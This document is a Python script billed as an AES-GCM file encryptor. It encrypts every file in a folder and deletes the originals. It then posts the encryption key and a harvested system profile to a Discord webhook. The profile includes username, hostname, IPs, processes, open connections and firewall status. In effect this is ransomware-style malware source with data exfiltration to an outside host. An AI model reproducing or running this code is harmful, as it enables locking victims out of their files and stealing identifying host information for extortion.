import psutil
import platform
import socket
import subprocess
import time
import os
import sys
import requests
import getpass
import json
import secrets
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# === CONFIGURABLE CONSTANTS ===
DEFAULT_KEY_FILE = "key.bin"
KEY_SIZE = 32
NONCE_SIZE = 12
ENCRYPTED_EXTENSION = ".enc"

# === TEXT MESSAGES ===
WELCOME_MESSAGE = "Welcome to AES-GCM File Encryptor Terminal 😎"
MENU_OPTIONS = "\n1. 🔒 Encrypt files\n2. 🔓 Decrypt files\n0. ❌ Exit"
INVALID_OPTION_MSG = "Invalid option. Exiting."
INVALID_PATH_MSG = "❌ Invalid folder path."
KEY_GEN_SUCCESS = "🔐 Key and nonce generated and saved to '{}'."
KEY_LOAD_SUCCESS = "🔑 Key and nonce loaded successfully."
ENCRYPT_SUCCESS = "✔ All files have been encrypted successfully."
DECRYPT_SUCCESS = "✔ All files have been decrypted successfully."
SAVE_KEY_WARNING = "🎉 Files encrypted. The key and system info have been sent. Keep the key safe!"
DISCORD_SEND_ERROR = "❌ Could not send data to Discord:"

class AESFileEncryptor:
    def __init__(self, folder_path: str, key_file: str = DEFAULT_KEY_FILE, webhook_url: str = ""):
        self.folder_path = Path(folder_path)
        self.key_file = Path(key_file)
        self.webhook_url = webhook_url
        self.key = None
        self.nonce = None
        self.aesgcm = None

    def generate_key(self):
        self.key = AESGCM.generate_key(bit_length=256)
        self.nonce = secrets.token_bytes(NONCE_SIZE)
        self.aesgcm = AESGCM(self.key)
        self.key_file.write_bytes(self.key + self.nonce)
        print(KEY_GEN_SUCCESS.format(self.key_file.name))
        self.send_data_to_discord()

    def send_data_to_discord(self):
        if not self.webhook_url:
            return

        system_info = self.collect_system_info()
        system_json_path = Path("system_info.json")
        with system_json_path.open("w") as f:
            json.dump(system_info, f, indent=4)

        try:
            with open(self.key_file, 'rb') as key_file, open(system_json_path, 'rb') as sys_file:
                files = {
                    'file': (self.key_file.name, key_file),
                    'file2': (system_json_path.name, sys_file),
                }
                response = requests.post(self.webhook_url, files=files)
                if response.status_code == 204:
                    print("📤 Key and system info sent to Discord webhook successfully.")
                else:
                    print(f"{DISCORD_SEND_ERROR} {response.status_code} {response.text}")
        except Exception as e:
            print(f"{DISCORD_SEND_ERROR} {e}")
        finally:
            if system_json_path.exists():
                system_json_path.unlink()

    def collect_system_info(self):
        try:
            ip_public = requests.get('https://api.ipify.org').text
        except:
            ip_public = "Unavailable"

        return {
            "username": getpass.getuser(),
            "hostname": socket.gethostname(),
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "cpu_cores": psutil.cpu_count(logical=True),
            "ram_total_gb": round(psutil.virtual_memory().total / (1024 ** 3), 2),
            "ip_local": socket.gethostbyname(socket.gethostname()),
            "ip_public": ip_public,
            "working_directory": str(Path.cwd()),
            "system_time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
            "cpu_usage": psutil.cpu_percent(interval=1),
            "memory_usage": psutil.virtual_memory().percent,
            "disk_usage": psutil.disk_usage('/').percent,
            "active_connections": self.get_active_connections(),
            "processes": self.get_processes(),
            "firewall_status": self.get_firewall_status()
        }

    def get_active_connections(self):
        connections = psutil.net_connections(kind='inet')
        return [{"local_address": conn.laddr, "remote_address": conn.raddr} for conn in connections if conn.status == 'ESTABLISHED']

    def get_processes(self):
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            processes.append({"pid": proc.info['pid'], "name": proc.info['name'], "user": proc.info['username']})
        return processes

    def get_firewall_status(self):
        # Assuming the system is Linux (for Windows or macOS, the command would differ)
        try:
            firewall_status = subprocess.check_output(['sudo', 'ufw', 'status']).decode('utf-8')
            return firewall_status
        except subprocess.CalledProcessError:
            return "Firewall status unavailable"

    def load_key(self):
        if not self.key_file.exists():
            raise FileNotFoundError(f"Key file not found: {self.key_file}")
        data = self.key_file.read_bytes()
        self.key = data[:KEY_SIZE]
        self.nonce = data[KEY_SIZE:]
        self.aesgcm = AESGCM(self.key)
        print(KEY_LOAD_SUCCESS)

    def encrypt_file(self, filepath: Path):
        data = filepath.read_bytes()
        encrypted = self.aesgcm.encrypt(self.nonce, data, None)
        encrypted_path = filepath.with_suffix(filepath.suffix + ENCRYPTED_EXTENSION)
        encrypted_path.write_bytes(encrypted)
        filepath.unlink()
        print(f"🛡️ Encrypted: {filepath.name}")

    def decrypt_file(self, filepath: Path):
        encrypted = filepath.read_bytes()
        decrypted = self.aesgcm.decrypt(self.nonce, encrypted, None)
        original_path = filepath.with_suffix("")
        original_path.write_bytes(decrypted)
        filepath.unlink()
        print(f"🔓 Decrypted: {filepath.name}")

    def encrypt_folder(self):
        for path in self.folder_path.glob("*"):
            if path.is_file() and not path.suffix.endswith(ENCRYPTED_EXTENSION):
                self.encrypt_file(path)
        print(ENCRYPT_SUCCESS)

    def decrypt_folder(self):
        for path in self.folder_path.glob(f"*{ENCRYPTED_EXTENSION}"):
            if path.is_file():
                self.decrypt_file(path)
        print(DECRYPT_SUCCESS)

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def slow_print(text, delay=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def main():
    clear_console()
    print("🧪 " + "="*40)
    slow_print(WELCOME_MESSAGE, 0.03)
    print("🧪 " + "="*40)
    print(MENU_OPTIONS)

    choice = input("\n👉 Choose an option (1/2/0): ").strip()

    if choice not in ["1", "2"]:
        print(INVALID_OPTION_MSG)
        return

    folder_path = input("\n📁 Enter the folder path: ").strip()

    if not Path(folder_path).exists():
        print(INVALID_PATH_MSG)
        return

    webhook_url = ""
    if choice == "1":
        webhook_url = input("🌐 Enter your Discord webhook URL: ").strip()

    encryptor = AESFileEncryptor(folder_path, webhook_url=webhook_url)

    if choice == "1":
        encryptor.generate_key()
        encryptor.encrypt_folder()
        print(SAVE_KEY_WARNING)
    elif choice == "2":
        key_path = input("🔑 Enter the key file path (key.bin): ").strip()
        encryptor.key_file = Path(key_path)
        try:
            encryptor.load_key()
            encryptor.decrypt_folder()
        except Exception as e:
            print(f"❌ Error decrypting files: {e}")

if __name__ == "__main__":
    main()
